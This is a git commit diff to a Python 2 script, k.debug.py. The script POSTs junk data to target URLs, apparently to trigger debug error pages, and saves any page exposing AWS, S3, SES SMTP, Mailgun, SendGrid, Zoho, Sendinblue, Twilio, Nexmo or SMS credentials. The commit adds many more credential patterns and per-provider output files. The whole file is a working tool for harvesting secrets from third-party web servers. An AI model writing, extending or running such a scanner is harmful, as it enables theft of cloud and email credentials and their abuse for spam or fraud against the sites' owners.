b12abc08ff169359129f319747a62c04a04a94c2
xcapri <43540712+xcapri@users.noreply.github.com>
2020-08-15 18:23:54 +0700

    Update k.debug.py

--- k.debug.py
+++ k.debug.py
@@ -18,67 +18,103 @@ def getBody(ourl):
         conn.request("POST", url.path, params)
         res = conn.getresponse()
         bodinya = res.read()
-        if re.search("outlook.com", bodinya):
+        if re.search("smtp-mail.outlook.com", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('outlook_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("AWS_KEY", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
-        elif re.search("email-smtp.", bodinya):
+            open('aws_key_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("S3_KEY", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('s3key_'+url.netloc+'.html',"w+").write(bodinya)
+        #startaws    
+
+        elif re.search("email-smtp.us-east-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp-fips.us-east-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.us-east-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp-fips.us-east-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.us-west-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp-fips.us-west-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ap-south-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ap-northeast-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ap-southeast-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ap-southeast-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ap-northeast-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.ca-central-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.sa-east-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.eu-west-2.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.us-gov-west-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.eu-central-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp.eu-west-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("email-smtp-fips.us-gov-west-1.amazonaws.com", bodinya):
+            print "K.DEBUG > ", ourl
+            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
+        #endaws
         elif re.search("mandrill", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
         elif re.search("smtp.mailgun", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('mailgin_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("smtp.sendgrid", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('sendgrid_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("smtp.zoho", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('zoho_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("sendinblue.com", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('sendinblue_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("CLICKSEND", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('clicksnd_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("TWILIO_", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('twilio_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("NEXMO_KEY", bodinya):
+            print "K.DEBUG > ", ourl
+            open('nexmo_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("SMS_", bodinya):
+            print "K.DEBUG > ", ourl
+            open('sms_'+url.netloc+'.html',"w+").write(bodinya)
         else:
             print "NO.DEBUG > ", ourl
-    # elif re.search('https://',ourl):
-    #     url = urlparse(ourl)
-    #     conn = httplib.HTTPConnection(url.netloc)
-    #     params = '1=1'   
-    #     conn.request("POST", url.path, params)
-    #     res = conn.getresponse()
-    #     bodinya = res.read()
-    #     if re.search("MAIL_HOST", bodinya):
-    #         print "K.DEBUG > ", ourl
-    #         open(url.netloc+'.html',"w+").write(bodinya)
-    #     else:
-    #         # print("No match")
-    #         print "NO.DEBUG > ", ourl
-    # else:
-    #     url = urlparse('http://'+ourl)
-    #     conn = httplib.HTTPConnection(url.netloc)
-    #     params = '1=1'   
-    #     conn.request("POST", url.path, params)
-    #     res = conn.getresponse()
-    #     bodinya = res.read()
-    #     if re.search("MAIL_HOST", bodinya):
-    #         print "K.DEBUG > ", ourl
-    #         open(url.netloc+'.html',"w+").write(bodinya)
-    #     else:
-    #         # print("No match")
-    #         print "NO.DEBUG > ", ourl
-        
 
-            
+        return res  
     
 
 
